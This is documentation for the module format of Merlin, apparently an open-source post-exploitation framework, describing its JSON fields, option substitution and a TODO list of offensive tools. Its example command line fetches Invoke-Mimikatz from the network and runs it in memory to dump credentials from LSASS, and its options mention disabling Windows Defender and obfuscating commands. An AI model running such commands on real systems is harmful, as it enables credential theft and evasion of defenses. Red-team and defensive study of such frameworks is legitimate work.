# Merlin Module
Modules are used to perform a set of pre-defined actions or execute a
program on an agent. The modules are described using JavaScript Object
Notation (JSON). Modules will be stored in `platform/arch/language/type`
 directories. Every module _must_ have the `base` object and _may_ have
 additional objects. Examples of the module structures can be found in
 the `data/modules/templates` directory. All keys used when describing a
 module will be lowercase (i.e. name and NOT Name).

## Base
The `base` module is required and is the lowest level of describing a
module and its function.


 Name   | Type  | Description | Example
 ---    | ---   | ---   | ---
 name   | string | The name of the module | "name": "MyModuleName"
 author | array of strings  | The names of the people that created the Merlin module | "author": ["Russel Van Tuyl (@Ne0ndog)"]
 credits | array of strings | A list of people to credit for underlying tools or techniques | "credits": ["Will Schroeder (@harmj0y)"]
 path   | array of strings | The file path to the module| "path": ["C", "windows", "system32"]
 platform   | string | The target platform the module can run on | "platform": "linux"
 arch   | string | The target architecture the module can run on | "arch": "x64"
 lang   | string | The target language the module leverages | "lang": "powershell" or "lang": "bash"
 privilege | bool | Does the module require elevated privileges? | "privilege": true
 notes | string | Miscelaneous notes about the module | "notes": "This module doesn't work well on Ubuntu 14.04"
 remote | string | The remote path where the script associated with the module can be found | "remote": "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1"
 local | array of strings | The local file system path where the script associated with the module can be found | "local": ["data", "src", "PowerSploit", "Exfiltration", "Invoke-Mimikatz.ps1"]
 options | array of objects | The configurable options for the module | "options": [{"name": "DumpCreds", "value": "true", "required": false, "description":"[Switch]Use mimikatz to dump credentials out of LSASS."}]
 description | string | A description of the module and its function | "description": "his script leverages Mimikatz 2.0 and Invoke-ReflectivePEInjection to reflectively load Mimikatz completely in memory."
 commands | array of strings | A list of the commands to be executed on the host when running the script | "commands": ["powershell.exe", "-nop", "-w", "0", "\"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1');","Invoke-Mimikatz", "{{DumpCreds.Flag}}", "{{DumpCerts.Flag}}", "{{Command}}", "{{ComputerName}}","\""]


### Remote vs Local
When the module leverages a script, it can be accessed with _either_ the
 `local` or `remote` values of the base module. The `local` specifies
 the file path on the server where the script can be found. Merlin _DOES
 NOT_ ship with scripts. However, they should be copied to the
 `data/source` directory using something like Git. For example, you move
 into the `data/source` direct and do a
 `git clone https://github.com/PowerShellMafia/PowerSploit.git`. When
the `local` source is used, the script is uploaded to the target from
the server. When the `remote` source is used, the script is downloaded
from that location to the target.

### Options
The `options` uses a special data type that requires 4 parts.

 Name   | Type  | Description | Example
 ---    | ---   | ---   | ---
 name | string | The name of the option | "name": "ComputerName"
 value | string | The configured value for the option | "value": "127.0.0.1"
 required | bool | Is this option required? | "required": false
 flag   | string | The command line flag for the option | "flag": "-ComputerName"
 description | string | A short description of the option | "description": "The target computer name to run the script on"

`name` is the name of the option displayed to the user and is used as a
variable in the `commands` section of the module file.

Sometimes a command line flag starts with a single dash and other times
it starts with a double dash (i.e. -h or --help). Other times the
command line flag is not descriptive enough to present to the user.
For example `-x` would not be a good name to display to the user when
configuring a module. For these reasons, the `flag` value is separate
from the `name` value. The `name` value can be used to alias the `flag`
value.

### Commands
The `commands` section of the module is used to provide the commands
that are going to be executed on the host. The array should consist of
every command in its own list item. You do not need to account for
spaces. This is automatically done when the command is executed on the
host.

You specify the location of an `option` by using double curly brace and
the option's `name` value. For example if want to create a module to use
the PowerShell Get-Process cmdlet with an option to specify the process
name, the command section would like
`["Get-Process", "{{processName}}"]`. When the module is executed, the
`{{processName}}` variable is replace with the option's `flag` value
and `value` data. The option is removed from the command if the `value`
is empty. This should the most common and practical notation.

When the `flag` is just a switch, as in it has no value, set the option
in the command section using {{processName.Flag}}. When the module is
executed, only the flag value will be provided and not the `value` data.
 It is important to note that the `value` must be `true` for the flag to
 be set. All other values will result in the flag being not set.

When the command take a positional character with no flag, use
`{{processName.Value}}`. When the module is executed, it will be replace
 with the option's `value` data or removed if `value` is empty.

## Powershell
The `powershell` module is used to provide additional configuration
options that pertain to PowerShell commands. Support for this module
type is currently lacking. At this time is being used as placeholder
for future development.

 Name   | Type  | Description | Example
 ---    | ---   | ---   | ---
 disableav | bool | Should Windows Defender be disabled prior to running the command? | "disableav" : true
 obfuscate | bool | Should the PowerShell command be obfuscated? | "obfuscate": false
 base64     | bool | Should the command be Base64 encoded? | "base64": true


 ### TODO
 * Add persistence module for PowerShell $PROFILE
 * Add persistence module for Windows Startup
 * Add persistence module for scheduled task
 * Add PowerView
 * Add BloodHound
 * Create tool download 3rd party scripts by name into /data/src by name or all
 * Add Invoke-Mimikittenz module
 * Add Power-Memory module
 * Add PowerShell-Suite module
 * Add Inviegh module
 * Add Invoke-TheHash modules
 * Add PowerSploit modules
 * Add Nishang modules
 * Add Linux Exploit Suggester module pentestmonkey, penturalabs
 * Add windows-exploit-suggester
 * Add winsploit as a non-basic Merlin module by porting functionality
 * https://github.com/slimm609/checksec.sh
 * Tater.ps1
 * Create a module for every MITRE ATT&CK
 * Create a persistence module from https://bohops.com/2018/02/26/leveraging-inf-sct-fetch-execute-techniques-for-bypass-evasion-persistence/
 * Port this to a Merlin Script https://github.com/harleyQu1nn/AggressorScripts/blob/master/EDR.cna
 * Add letmein.ps1 from https://github.com/0xdea/tactical-exploitation
 * Add modules for these code execution methods where applicable https://github.com/pwndizzle/CodeExecutionOnWindows